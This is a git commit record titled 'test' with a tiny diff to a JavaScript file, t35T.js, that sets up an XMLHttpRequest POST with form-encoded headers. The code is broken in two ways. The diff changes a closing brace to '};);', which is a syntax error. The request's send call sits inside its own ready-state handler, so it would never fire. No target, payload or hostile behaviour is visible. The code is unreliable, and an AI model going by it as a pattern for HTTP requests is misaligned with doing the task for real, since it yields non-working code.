69b4221210e9c54760c29cfd5ba87b24badb594e
k4ndAr3c <k4ndAr3c@github.com>
2016-06-01 18:05:55 +0200

    test

--- t35T.js
+++ t35T.js
@@ -4,4 +4,4 @@ http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 http.setRequestHeader("Content-length", params.length);
 http.setRequestHeader("Connection", "close");
 http.onreadystatechange = function(){if(http.readyState == 4 && http.status == 200){http.send(params);}};
-};
+};);
